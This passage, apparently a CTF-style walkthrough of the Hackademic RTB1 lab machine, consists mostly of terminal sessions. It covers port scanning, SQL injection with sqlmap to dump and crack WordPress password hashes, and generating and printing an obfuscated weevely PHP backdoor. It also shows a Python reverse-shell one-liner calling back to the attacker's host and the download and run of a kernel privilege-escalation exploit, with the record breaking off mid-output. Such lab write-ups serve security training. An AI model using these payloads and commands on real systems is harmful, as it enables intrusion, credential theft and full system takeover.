</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 192.168.80.146 -sV -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-28 17:14 CEST
</span><span class='line'>Nmap scan report for 192.168.80.146
</span><span class='line'>Host is up (0.00032s latency).
</span><span class='line'>Not shown: 65533 filtered ports
</span><span class='line'>PORT   STATE  SERVICE VERSION
</span><span class='line'>22/tcp closed ssh
</span><span class='line'>80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
</span><span class='line'>MAC Address: 00:0C:29:01:8A:4D (VMware)
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 153.05 seconds</span></code></pre></td></tr></table></div></figure>


<p>Nikto output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 192.168.80.146 
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.80.146
</span><span class='line'>+ Target Hostname:    192.168.80.146
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2015-04-28 17:18:04 (GMT2)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.2.15 (Fedora)
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, inode: 12748, size: 1475, mtime: Sun Jan  9 18:22:11 2011
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ 7354 requests: 0 error(s) and 7 item(s) reported on remote host
</span><span class='line'>+ End Time:           2015-04-28 17:18:15 (GMT2) (11 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>There was SQL injection on the web page, vulnerable wordpress instance:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.146/Hackademic_RTB1/?cat=1'
</span><span class='line'>SELECT * FROM wp_categories WHERE cat_ID = 1\\\' LIMIT 1</span></code></pre></td></tr></table></div></figure>


<p>This will take longer and it&rsquo;s not necessery to dump everything:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u "http://192.168.80.146/Hackademic_RTB1/?cat=1" --dump-all</span></code></pre></td></tr></table></div></figure>


<p>Some of the output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>--current-user:
</span><span class='line'>current user:    'root@localhost'
</span><span class='line'>--current-db:
</span><span class='line'>current database:    'wordpress'
</span><span class='line'>--privileges:
</span><span class='line'>[*] 'root'@'localhost' (administrator) [27]:
</span><span class='line'>    privilege: ALTER
</span><span class='line'>    privilege: ALTER ROUTINE
</span><span class='line'>    privilege: CREATE
</span><span class='line'>    privilege: CREATE ROUTINE
</span><span class='line'>    privilege: CREATE TEMPORARY TABLES
</span><span class='line'>    privilege: CREATE USER
</span><span class='line'>    privilege: CREATE VIEW
</span><span class='line'>    privilege: DELETE
</span><span class='line'>    privilege: DROP
</span><span class='line'>    privilege: EVENT
</span><span class='line'>    privilege: EXECUTE
</span><span class='line'>    privilege: FILE
</span><span class='line'>    privilege: INDEX
</span><span class='line'>    privilege: INSERT
</span><span class='line'>    privilege: LOCK TABLES
</span><span class='line'>    privilege: PROCESS
</span><span class='line'>    privilege: REFERENCES
</span><span class='line'>    privilege: RELOAD
</span><span class='line'>    privilege: REPLICATION CLIENT
</span><span class='line'>    privilege: REPLICATION SLAVE
</span><span class='line'>    privilege: SELECT
</span><span class='line'>    privilege: SHOW DATABASES
</span><span class='line'>    privilege: SHOW VIEW
</span><span class='line'>    privilege: SHUTDOWN
</span><span class='line'>    privilege: SUPER
</span><span class='line'>    privilege: TRIGGER
</span><span class='line'>    privilege: UPDATE
</span><span class='line'>--passwords:
</span><span class='line'>database management system users password hashes:
</span><span class='line'>[*] root [1]:
</span><span class='line'>    password hash: 2eaec110380126d7</span></code></pre></td></tr></table></div></figure>


<p>The wordpress could be scanned using wpscan too:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# wpscan http://192.168.80.146/Hackademic_RTB1</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# cat wp_users.csv 
</span><span class='line'>ID,user_idmode,user_ip,user_icq,user_msn,user_yim,user_url,user_aim,user_pass,user_login,user_level,user_email,user_status,user_domain,user_browser,user_nicename,user_nickname,user_lastname,user_firstname,user_registered,user_description,user_activation_key
</span><span class='line'>1,login,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,21232f297a57a5a743894a0e4a801fc3,NickJames,1,NickJames@hacked.com,0,&lt;blank>,&lt;blank>,nickjames,NickJames,James,Nick,2010-10-25 20:40:23,&lt;blank>,&lt;blank>
</span><span class='line'>2,login,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,b986448f0bb9e5e124ca91d3d650f52c,JohnSmith,0,JohnSmith@hacked,0,&lt;blank>,&lt;blank>,johnsmith,JohnSmith,Smith,John,2010-10-25 21:25:22,&lt;blank>,&lt;blank>
</span><span class='line'>3,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,7cbb3252ba6b7e9c422fac5334d22054,GeorgeMiller,10,GeorgeMiller@hacked.com,0,&lt;blank>,&lt;blank>,georgemiller,GeorgeMiller,Miller,George,2011-01-07 03:08:51,&lt;blank>,&lt;blank>
</span><span class='line'>4,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,a6e514f9486b83cb53d8d932f9a04292,TonyBlack,0,TonyBlack@hacked.com,0,&lt;blank>,&lt;blank>,tonyblack,TonyBlack,Black,Tony,2011-01-07 03:09:55,&lt;blank>,&lt;blank>
</span><span class='line'>5,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,8601f6e1028a8e8a966f6c33fcd9aec4,JasonKonnors,0,JasonKonnors@hacked.com,0,&lt;blank>,&lt;blank>,jasonkonnors,JasonKonnors,Konnors,Jason,2011-01-07 03:10:36,&lt;blank>,&lt;blank>
</span><span class='line'>6,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,http://,&lt;blank>,50484c19f1afdaf3841a0d821ed393d2,MaxBucky,0,MaxBucky@hacked.com,0,&lt;blank>,&lt;blank>,maxbucky,MaxBucky,Bucky,Max,2011-01-07 03:11:18,&lt;blank>,&lt;blank></span></code></pre></td></tr></table></div></figure>


<p>&ldquo;GeorgeMiller:q1w2e3&rdquo; has the highest privileges (user_level 10).</p>

<p>We crack the hashes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# egrep "^[0-9]+" wp_users.csv| awk -F, '{print $10 ":"  $9}'  > /tmp/wp_users.john
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# john /tmp/wp_users.john --format=raw-md5 
</span><span class='line'>Loaded 6 password hashes with no different salts (Raw MD5 [128/128 SSE2 intrinsics 12x])
</span><span class='line'>NickJames:admin
</span><span class='line'>JohnSmith:PUPPIES
</span><span class='line'>GeorgeMiller:q1w2e3
</span><span class='line'>TonyBlack:napoleon
</span><span class='line'>JasonKonnors:maxwell
</span><span class='line'>MaxBucky:kernel
</span><span class='line'>guesses: 6  time: 0:00:00:01 DONE (Tue Apr 28 18:16:40 2015)  c/s: 7580K  trying: kernel - kernit
</span><span class='line'>Use the "--show" option to display all of the cracked passwords reliably</span></code></pre></td></tr></table></div></figure>


<p>We log in using GeorgeMiller&rsquo;s account and under &ldquo;Manage -> Files&rdquo; we upload the generated weevely shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely generate 1234
</span><span class='line'><span class="o">[</span>generate.php<span class="o">]</span> Backdoor file <span class="s1">&#39;weevely.php&#39;</span> created with password <span class="s1">&#39;1234&#39;</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">root</span><span class="o">@</span><span class="nx">kali32</span><span class="o">:~/.</span><span class="nx">sqlmap</span><span class="o">/</span><span class="nx">output</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">80.146</span><span class="o">/</span><span class="nx">dump</span><span class="o">/</span><span class="nx">wordpress</span><span class="c1"># cat weevely.php </span>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$duiq</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;sc&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;scssctscrsc_scrsceplscasccsce&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$lucw</span><span class="o">=</span><span class="s2">&quot;MoJGEpPjMpeyRrPSczNCcwoh7ZWNobyAnPwohCcuJGsuJz4nO2V2YWwoYmFzZTY0X2RlwohY29wohkZShwoh&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$udtq</span><span class="o">=</span><span class="s2">&quot;JGM9J2NvdwohWwoh50JzskYwohT0kX0NPT0tJRTtpZihyZXNlwohdCgkYSwohkwoh9wohPScxMicwohgJwohiYgJG&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$foif</span><span class="o">=</span><span class="s2">&quot;IGpvaW4oYXJywohYXlfc2xpY2UoJGwohEsJGMoJGwohEpLTMpwohKSkpKTtlY2hvICc8LycuwohJGsuJz4nwohO30=&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$kvzf</span><span class="o">=</span><span class="s2">&quot;wcmwohVnX3JlcGxhY2UwohoYXJwohyYwohXkoJy9bXlx3PVxzXSwoh8nLCcvXHMwohvJyksIGFycmF5wohKCcnLCcrJykwohs&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$tkjs</span> <span class="o">=</span> <span class="nv">$duiq</span><span class="p">(</span><span class="s2">&quot;v&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;bvavsve6v4v_vdvevcvovdve&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$nqkm</span> <span class="o">=</span> <span class="nv">$duiq</span><span class="p">(</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;dcdrdedatded_fudncdtdidodn&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$itsd</span> <span class="o">=</span> <span class="nv">$nqkm</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$tkjs</span><span class="p">(</span><span class="nv">$duiq</span><span class="p">(</span><span class="s2">&quot;woh&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$udtq</span><span class="o">.</span><span class="nv">$lucw</span><span class="o">.</span><span class="nv">$kvzf</span><span class="o">.</span><span class="nv">$foif</span><span class="p">)));</span> <span class="nv">$itsd</span><span class="p">();</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>We connect using weevely and found out the mysql root password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely http://192.168.80.146/Hackademic_RTB1/wp-content/plugins/hello.php 1234
</span><span class='line'>
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>bin:x:1:1:bin:/bin:/sbin/nologin
</span><span class='line'>daemon:x:2:2:daemon:/sbin:/sbin/nologin
</span><span class='line'>adm:x:3:4:adm:/var/adm:/sbin/nologin
</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
</span><span class='line'>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
</span><span class='line'>operator:x:11:0:operator:/root:/sbin/nologin
</span><span class='line'>games:x:12:100:games:/usr/games:/sbin/nologin
</span><span class='line'>gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
</span><span class='line'>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
</span><span class='line'>nobody:x:99:99:Nobody:/:/sbin/nologin
</span><span class='line'>vcsa:x:69:499:virtual console memory owner:/dev:/sbin/nologin
</span><span class='line'>avahi-autoipd:x:499:498:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin
</span><span class='line'>ntp:x:38:38::/etc/ntp:/sbin/nologin
</span><span class='line'>dbus:x:81:81:System message bus:/:/sbin/nologin
</span><span class='line'>rtkit:x:498:494:RealtimeKit:/proc:/sbin/nologin
</span><span class='line'>nscd:x:28:493:NSCD Daemon:/:/sbin/nologin
</span><span class='line'>tcpdump:x:72:72::/:/sbin/nologin
</span><span class='line'>avahi:x:497:492:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin
</span><span class='line'>haldaemon:x:68:491:HAL daemon:/:/sbin/nologin
</span><span class='line'>openvpn:x:496:490:OpenVPN:/etc/openvpn:/sbin/nologin
</span><span class='line'>apache:x:48:489:Apache:/var/www:/sbin/nologin
</span><span class='line'>saslauth:x:495:488:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
</span><span class='line'>mailnull:x:47:487::/var/spool/mqueue:/sbin/nologin
</span><span class='line'>smmsp:x:51:486::/var/spool/mqueue:/sbin/nologin
</span><span class='line'>smolt:x:494:485:Smolt:/usr/share/smolt:/sbin/nologin
</span><span class='line'>sshd:x:74:484:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
</span><span class='line'>pulse:x:493:483:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
</span><span class='line'>gdm:x:42:481::/var/lib/gdm:/sbin/nologin
</span><span class='line'>p0wnbox.Team:x:500:500:p0wnbox.Team:/home/p0wnbox.Team:/bin/bash
</span><span class='line'>mysql:x:27:480:MySQL Server:/var/lib/mysql:/bin/bash</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">@</span><span class="nx">HackademicRTB1</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">Hackademic_RTB1</span> <span class="err">$</span> <span class="nx">cat</span> <span class="nx">wp</span><span class="o">-</span><span class="nx">config</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="c1">// ** MySQL settings ** //</span>
</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;wordpress&#39;</span><span class="p">);</span>     <span class="c1">// The name of the database</span>
</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span>     <span class="c1">// Your MySQL username</span>
</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;lz5yedns&#39;</span><span class="p">);</span> <span class="c1">// ...and password</span>
</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">);</span>     <span class="c1">// 99% chance you won&#39;t need to change this value</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Change the prefix if you want to have multiple blogs in a single database.</span>
</span><span class='line'><span class="nv">$table_prefix</span>  <span class="o">=</span> <span class="s1">&#39;wp_&#39;</span><span class="p">;</span>   <span class="c1">// example: &#39;wp_&#39; or &#39;b2&#39; or &#39;mylogin_&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Change this to localize WordPress.  A corresponding MO file for the</span>
</span><span class='line'><span class="c1">// chosen language must be installed to wp-includes/languages.</span>
</span><span class='line'><span class="c1">// For example, install de.mo to wp-includes/languages and set WPLANG to &#39;de&#39;</span>
</span><span class='line'><span class="c1">// to enable German language support.</span>
</span><span class='line'><span class="nb">define</span> <span class="p">(</span><span class="s1">&#39;WPLANG&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* Stop editing */</span>
</span><span class='line'>
</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;ABSPATH&#39;</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span><span class='line'><span class="k">require_once</span><span class="p">(</span><span class="nx">ABSPATH</span><span class="o">.</span><span class="s1">&#39;wp-settings.php&#39;</span><span class="p">);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Because our web shell doesn&rsquo;t have assigned tty, we use python to create another reverse shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>@HackademicRTB1:/tmp <span class="nv">$ </span>sudo -l
</span><span class='line'>sudo: sorry, you must have a tty to run sudo
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">root</span><span class="nd">@kali32</span><span class="p">:</span><span class="o">~</span><span class="c"># nc -lp 1338</span>
</span><span class='line'>
</span><span class='line'><span class="nd">@HackademicRTB1</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span> <span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&quot;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&#39;/bin/bash&#39;)&quot;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">80.137</span> <span class="mi">1338</span>
</span></code></pre></td></tr></table></div></figure>


<p>For privilege escalation, we use the following exploit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali32</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">exploitdb</span><span class="err">#</span> <span class="n">head</span> <span class="n">platforms</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="mf">15285.</span><span class="n">c</span>
</span><span class='line'><span class="c1">//source: http://www.vsecurity.com/resources/advisory/20101019-1/</span>
</span><span class='line'>
</span><span class='line'><span class="o">/*</span>
</span><span class='line'> <span class="o">*</span> <span class="n">Linux</span> <span class="n">Kernel</span> <span class="o">&lt;=</span> <span class="mf">2.6.36</span><span class="o">-</span><span class="n">rc8</span> <span class="n">RDS</span> <span class="n">privilege</span> <span class="n">escalation</span> <span class="n">exploit</span>
</span><span class='line'> <span class="o">*</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2010</span><span class="o">-</span><span class="mi">3904</span>
</span><span class='line'> <span class="o">*</span> <span class="n">by</span> <span class="n">Dan</span> <span class="n">Rosenberg</span> <span class="o">&lt;</span><span class="n">drosenberg</span><span class="err">@</span><span class="n">vsecurity</span><span class="p">.</span><span class="n">com</span><span class="o">&gt;</span>
</span><span class='line'> <span class="o">*</span>
</span><span class='line'> <span class="o">*</span> <span class="n">Copyright</span> <span class="mi">2010</span> <span class="n">Virtual</span> <span class="n">Security</span> <span class="n">Research</span><span class="p">,</span> <span class="n">LLC</span>
</span><span class='line'> <span class="o">*</span>
</span><span class='line'> <span class="o">*</span> <span class="n">The</span> <span class="n">handling</span> <span class="n">functions</span> <span class="k">for</span> <span class="n">sending</span> <span class="n">and</span> <span class="n">receiving</span> <span class="n">RDS</span> <span class="n">messages</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.0<span class="nv">$ </span>wget --no-check-certificate https://www.exploit-db.com/download/15285 -O a.c
</span><span class='line'>bash-4.0<span class="nv">$ </span>gcc a.c
</span><span class='line'>gcc a.c
</span><span class='line'>bash-4.0<span class="nv">$ </span>./a.out
</span><span class='line'>./a.out
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Linux kernel &gt;<span class="o">=</span> 2.6.30 RDS socket exploit
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> by Dan Rosenberg
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving kernel addresses...
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved security_ops to 0xc0aa19ac
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved default_security_ops to 0xc0955c6c
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved cap_ptrace_traceme to 0xc055d9d7
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved commit_creds to 0xc044e5f1
</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved prepare_kernel_cred to 0xc044e452
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Overwriting security ops...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Overwriting <span class="k">function</span> pointer...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Triggering payload...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Restoring <span class="k">function</span> pointer...
